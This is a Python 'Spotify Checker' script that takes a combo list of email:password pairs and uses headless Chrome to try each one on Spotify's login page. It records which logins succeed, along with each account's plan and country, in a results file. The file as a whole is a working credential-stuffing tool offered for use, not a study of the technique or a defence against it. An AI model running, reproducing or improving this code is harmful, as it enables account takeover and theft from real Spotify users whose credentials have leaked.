import pip

install=[
    'selenium',
    'webdriver-manager',
    'os',
    'time'
]

def import_or_install(package):
    try:
        __import__(package)
    except ImportError:
        pip.main(['install', package])
for i in range(2):
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service as ChromeService
        from webdriver_manager.chrome import ChromeDriverManager
        from selenium.common.exceptions import NoSuchElementException
        from selenium.webdriver.common.keys import Keys
        from selenium.webdriver.common.by import By
        import os
        import time
    except:
        for i in range(len(install)):
            import_or_install(install[i])
options = webdriver.ChromeOptions()
options.headless = True #hide Chrome Driver
driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()),options=options)
driver.get('https://www.spotify.com/account/overview')
print()
print('''\033[1;31;40m                                                                           
                              ____                 _    _   __            ____  _                  _                
                             / ___|  _ __    ___  | |_ (_) / _| _   _    / ___|| |__    ___   ___ | | __  ___  _ __ 
                             \___ \ | '_ \  / _ \ | __|| || |_ | | | |  | |    | '_ \  / _ \ / __|| |/ / / _ \| '__|
                              ___) || |_) || (_) || |_ | ||  _|| |_| |  | |___ | | | ||  __/| (__ |   < |  __/| |   
                             |____/ | .__/  \___/  \__||_||_|   \__, |   \____||_| |_| \___| \___||_|\_\ \___||_|   
                                    |_|                         |___/                                               
                                          
             © Spotify Checker by SALAH-ELHINT                                                      
\033''')
print()
while True:
    print('''\033[1;34;40m''',end='')
    combo_name=input('Entry Combo: \033[1;33;40m')
    print('''\033[1;34;40m''',end='')
    if os.path.exists(f'{combo_name}.txt') :
        break
print()
file_combo = open(f'{combo_name}.txt', 'r+')
file_combo_failed = open('combo_failed.txt', 'a+')
file_combo_successful = open('combo_successful.txt', 'a+')
bad_acc,good_acc,prem_acc=0,0,0
n=-1
def line_num(name_file,line_count = 0):
    for line in name_file:
        if ':' in line:
            if line != '\n':
                line_count = line_count+1
    return line_count
print(f'''\033[1;32;40m _________ Settings _______________________________________________\n\
|\n| \033[1;34;40m[INFO]\033[0;0m\033[1;32;40m [>>] {combo_name}.txt Loaded : \033[1;33;40m{line_num(file_combo)}\033[0;0m\033[1;32;40m
|\n\
|\n| \033[1;34;40m[INFO]\033[0;0m\033[1;32;40m [>>] proxy.txt Loaded : \033[1;33;40m0\033[0;0m\033[1;32;40m
|\n\
|\n\
|_________________________________________________________________\033\n''')
time.sleep(3)
file_combo = open(f'{combo_name}.txt', 'a+')
file_combo.writelines('\n')
file_combo.close()
file_combo = open(f'{combo_name}.txt', 'r+')
try:
    for line_combo in file_combo:
        file_combo = open(f'{combo_name}.txt', 'r+')
        n = n + 1
        if ':' in line_combo:
            print()
            print(f'\033[1;33;40m Checker is running - \033[1;32;40m[+] Good Accounts  : [{good_acc}] \033[1;33;40m~~~ \033[1;31;40m[-] Bad Accounts  :  [{bad_acc}] ',end='\r')
            d = line_combo.split(":")
            mail, passw = d[0], d[1]
            try:
                try:
                    time.sleep(0.1)
                    driver.find_element(By.NAME,'username').send_keys(mail)
                    driver.find_element(By.NAME,'password').send_keys(passw)
                    driver.find_element(By.XPATH,'//*[@id="login-button"]').click()
                    time.sleep(0.5)
                    driver.find_element(By.ID,'login-username').clear()
                    driver.find_element(By.ID,'login-password').clear()
                except NoSuchElementException:
                    time.sleep(0.1)
                    driver.find_element(By.ID,'login-username').send_keys(mail)
                    driver.find_element(By.ID,'login-password').send_keys(passw)
                    driver.find_element(By.ID,'login-button').click()
                    time.sleep(0.5)
                    driver.find_element(By.ID,'login-username').clear()
                    driver.find_element(By.ID,'login-password').clear()
                try:
                    technical_difficult = driver.find_element(By.XPATH,'//*[@id="app"]/body/div[1]/div[2]/div/div[2]/div/p/span/a')
                    print()
                    print(f'\033[1;33;40m[!]  ####  technical difficulties  ####  \033')
                    driver.close()
                    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
                    driver.get('https://www.spotify.com/account/overview')
                except NoSuchElementException:
                    print()
                    print(f'\033[1;31;40m[!] Login failed ## (Incorrect) => \033[1;37;40m{mail}:{passw}')
                    print()
                    file_combo = open(f'{combo_name}.txt', "r+")
                    line_combo = file_combo.readlines()
                    line_r = line_combo[n].rstrip()
                    line_combo_Incorrect = (f'[!] Incorrect | {line_r}\n')
                    file_combo_failed = open('combo_failed.txt', 'a+')
                    file_combo_failed.write(line_combo_Incorrect)
                    file_combo_failed.close()
                    line_combo[n] = (f'[!] Login failed ## (Incorrect) => {mail}={passw}')
                    file_combo = open(f'{combo_name}.txt', "w+")
                    file_combo.writelines(line_combo)
                    file_combo.close()
                    bad_acc = bad_acc + 1
            except NoSuchElementException:
                acc_free = driver.find_element(By.XPATH,'//*[@id="your-plan"]/section/div/div[1]/div[1]/span')
                if acc_free.is_displayed():
                    region = driver.find_element(By.XPATH,
                        '//*[@id="__next"]/div/div/div[2]/div[3]/div[2]/div/article[1]/section/table/tbody/tr[4]/td[2]')
                    print()
                    acc_txt = acc_free.text
                    if acc_txt != 'Spotify Free':
                        prem_acc = prem_acc + 1
                    region_txt = region.text
                    print(f'\033[1;32;40m[+] Login successful ## ({acc_txt}) => \033[1;37;40m{mail}:{passw}')
                    driver.close()
                    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
                    driver.get('https://www.spotify.com/account/overview')
                    file_combo = open(f'{combo_name}.txt', "r+")
                    line_combo = file_combo.readlines()
                    line_w = line_combo[n].rstrip()
                    line_combo_successfulll = (f'{line_w} | Plan : {acc_txt} | Country : {region_txt}\n')
                    file_combo_successful = open('combo_successful.txt', 'a+')
                    file_combo_successful.write(line_combo_successfulll)
                    file_combo_successful.close()
                    line_combo[n] = (f'[+] Login successful ## ({acc_txt}) => {mail}={passw}')
                    file_combo = open(f'{combo_name}.txt', "w+")
                    file_combo.writelines(line_combo)
                    file_combo.close()
                good_acc = good_acc + 1
except NoSuchElementException:

    print()
    print('\033[1;33;40m\n                  #############################                  HTTP ERROR 403                  #############################\n\033[1;31;40m')  
finally:
    print()
    driver.close()
    print(f'\n\033[1;33;40m Checker result - \033[1;32;40m[+] Good Accounts  : [{good_acc}] \033[1;33;40m~~~ \033[1;31;40m[-] Bad Accounts  :  [{bad_acc}] \n')
